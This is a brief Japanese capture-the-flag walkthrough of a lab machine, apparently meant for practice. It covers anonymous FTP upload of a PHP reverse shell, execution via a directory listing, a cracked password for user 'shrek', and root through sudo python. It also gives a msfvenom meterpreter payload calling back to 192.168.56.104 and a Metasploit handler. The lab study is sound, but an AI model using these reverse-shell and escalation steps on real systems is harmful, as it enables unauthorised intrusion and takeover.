- スナップショットをとる
### 論点
- ftpでphp-reverse-shell
### keyword
- ディレクトリ リスティング,hashes.comは使えない,crack station,pkexec,su,sudo-l(python)
### 課題
- ftp,/tmpの両方にx64,x86のmsfvenomをおいたが、reverse-shellは失敗する
## 攻略(1)
- nmap
  - ftpにanoymousで接続できるのがわかる
- gobusterするとfilesというサイトがあってディレクトリリスティングできることがわかる
  - `gobuster dir -u $IP -w $dirsmall` 
- ftpに接続する
  - `ftp $IP`
  - 特に何もない 
- ftpにphp-reverse-shell.phpを送る
  - ftpに接続後`put php-reverse-shell.php` 
- ディレクトリリスティングのサイトからreverse-shellを実行する
- 対話型シェルにする
- `important.txt`がある
  - `/.runme.sh`にパスワードとユーザ名がわかる。
- crack stationからonionがわかる
- `su shrek`
- SUID
  - pkexecにgccもあるのでたぶん使える
  - それ以外は使えそうにない
- `sudo -l`
- `sudo python3.5 -c 'import os; os.system("/bin/bash")'`  

## 攻略(2)
- php-reverse-shell.phpを送る代わりにftpにmsfvenomを送る
- `msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.56.104 LPORT=4444 -f raw -o reverse.php`
- reverse.phpをftpでuploadする
- handlerで待ち受ける

```
use exploit/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost 192.168.56.104
set lport 4444
run
```

- 対話型シェルにして、あとは同じ
- `su shrek` password:onion
- システム内探索ランキングする
- 注意
  - suggesterやっても何も出ない
  - pkexecもできない

